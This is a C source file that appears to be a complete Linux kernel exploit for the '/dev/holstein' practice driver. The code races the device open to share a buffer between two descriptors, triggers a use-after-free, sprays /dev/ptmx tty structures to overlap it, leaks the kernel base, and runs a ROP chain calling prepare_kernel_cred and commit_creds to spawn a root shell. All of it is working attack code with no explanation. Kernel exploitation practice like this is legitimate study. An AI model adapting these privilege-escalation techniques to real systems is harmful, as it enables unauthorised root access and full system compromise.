#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#define debug(msg, ...)                                                        \
    {                                                                          \
        if (DEBUG_FLAG) {                                                      \
            fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);                   \
        }                                                                      \
    }
#define info_prefix        "[*] "
#define info(msg, ...)     printf(info_prefix msg "\n", ##__VA_ARGS__);
#define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
#define fatal(msg, ...)                                                        \
    {                                                                          \
        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
        exit(EXIT_FAILURE);                                                    \
    }
#define pause()                                                                \
    {                                                                          \
        printf(info_prefix "Press ENTER to continue");                         \
        getchar();                                                             \
    }
#define var(var)     printf(info_prefix #var " = 0x%016llx\n", var);
#define rebase(addr) (addr - RAW_KBASE + kbase)

#define DEVICE_NAME "/dev/holstein"
#define RAW_KBASE   0xffffffff81000000

#define tty_struct_magic 0x5401

#define mov_rdi_rax_rep_movsq   rebase(0xffffffff8165094b)
#define push_rdx_pop_rsp        rebase(0xffffffff81137da8)
#define pop_rdi                 rebase(0xffffffff810b13c5)
#define pop_rcx_rdx_rsi_rdi_rbp rebase(0xffffffff810012b0)

#define prepare_kernel_cred rebase(0xffffffff81072580)
#define commit_creds        rebase(0xffffffff810723e0)
#define swapgs_restore_regs_and_return_to_usermode                             \
    rebase(0xffffffff81800e10 + 22)

typedef unsigned long long u64;
typedef unsigned int       u32;
typedef unsigned char      u8;

u8 DEBUG_FLAG = 0;

int  fd1, fd2;
char buf[0x400];
u64  g_buf_addr;

u64 user_cs, user_rflags, user_sp, user_ss;
u64 cookie, kbase, offset;
u64 tmp_buf, cred_struct;

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        fatal("Failed to get root uid, current uid = %d", uid);
    }
    info("Spawning shell as root uid");
    system("/bin/sh");
}

int create_overlap(void);

void ropchain(void) {
    u64 *ptr = (u64 *)buf;
    u64  i = 0;
    ptr[i++] = pop_rdi;
    ptr[i++] = 0;
    ptr[i++] = prepare_kernel_cred;
    ptr[i++] = pop_rcx_rdx_rsi_rdi_rbp;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = mov_rdi_rax_rep_movsq;
    ptr[i++] = commit_creds;
    ptr[i++] = swapgs_restore_regs_and_return_to_usermode;
    ptr[i++] = 0;
    ptr[i++] = 0;
    ptr[i++] = (size_t)spawn_shell;
    ptr[i++] = user_cs;
    ptr[i++] = user_rflags;
    ptr[i++] = user_sp;
    ptr[i++] = user_ss;

    *(u64 *)&buf[0x3f8] = push_rdx_pop_rsp;
    write(fd2, buf, sizeof(buf));
}

void rop_privesc() {
    ropchain();
    int victim_ptmx_fd = create_overlap();
    read(fd2, buf, sizeof(buf));
    *(u64 *)&buf[0x18] = g_buf_addr + 0x3f8 - 0xc * 8;
    write(fd2, buf, sizeof(buf));
    /* 0x8 to accomodate `pop rbp;` */
    ioctl(victim_ptmx_fd, 0xdeadbeef, g_buf_addr - 0x8);
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    debug("User state saved");
}

u8 race_win = 0;

/* gettid() is not available on musl-gcc */
pid_t _gettid(void) {
    return syscall(SYS_gettid);
}

void *race(void *arg) {
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(_gettid(), sizeof(cpu_set_t), cpu_set))
        fatal("sched_setaffinity");
    while (1) {
        while (!race_win) {
            int fd = open(DEVICE_NAME, O_RDWR);
            if (fd == fd2) race_win = 1;
            if (!race_win && fd != -1) close(fd);
        }
        if (write(fd1, "A", 1) != 1 || write(fd2, "A", 1) != 1) {
            close(fd1);
            close(fd2);
            race_win = 0;
        } else {
            break;
        }
        usleep(1000);
    }
    return NULL;
}

void *spray_thread(void *arg) {
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(_gettid(), sizeof(cpu_set_t), cpu_set))
        fatal("sched_setaffinity");

    u32 x;
    u64 spray[512];

    for (u64 i = 0; i < 512; i++) {
        usleep(10);
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] < 0) {
            for (u64 j = 0; j < i; j++) close(spray[j]);
            return (void *)-1;
        }
        if (read(fd2, &x, sizeof(u32)) == sizeof(u32) &&
            x == tty_struct_magic) {
            for (u64 j = 0; j < i; j++) close(spray[j]);
            return (void *)spray[i];
        }
    }
    for (u64 i = 0; i < 512; i++) close(spray[i]);
    return (void *)-1;
}

int create_overlap(void) {
    pthread_t th1, th2;

    char buf[0x10] = {0};

    cpu_set_t t1_cpu, t2_cpu;
    CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);

    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    info("next fds: %d, %d", fd1, fd2);

    pthread_create(&th1, NULL, race, (void *)&t1_cpu);
    pthread_create(&th2, NULL, race, (void *)&t2_cpu);
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);

    char check[] = "Hello, World!";
    write(fd1, check, sizeof(check));
    read(fd2, buf, sizeof(check));
    if (strcmp(buf, check) != 0) {
        fatal("Unluck");
    }
    info("won the race");
    memset(buf, 0, sizeof(check));
    write(fd1, buf, sizeof(buf));

    /* UAF */
    close(fd1);

    long victim_fd = -1;
    victim_fd = (long)spray_thread(&t1_cpu);
    while (victim_fd == -1) {
        info("spraying on another CPU...");
        pthread_create(&th1, NULL, spray_thread, (void *)&t2_cpu);
        pthread_join(th1, (void *)&victim_fd);
    }
    info("overlap OK: victim_fd = %ld", victim_fd);

    return victim_fd;
}

int main(int argc, char *argv[]) {
    for (size_t i = 0; i < argc; i++) {
        if (strcmp(argv[i], "DEBUG") == 0) {
            DEBUG_FLAG = 1;
            break;
        }
    }
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    save_user_state();

    create_overlap();
    read(fd2, buf, sizeof(buf));

    kbase = *(u64 *)&buf[0x18] - 0xc3afe0;
    if ((kbase & 0xfff) != 0) kbase += 0x120;
    var(kbase);
    g_buf_addr = *(u64 *)&buf[0x38] - 0x38;
    var(g_buf_addr);
    rop_privesc();

    return 0;
}
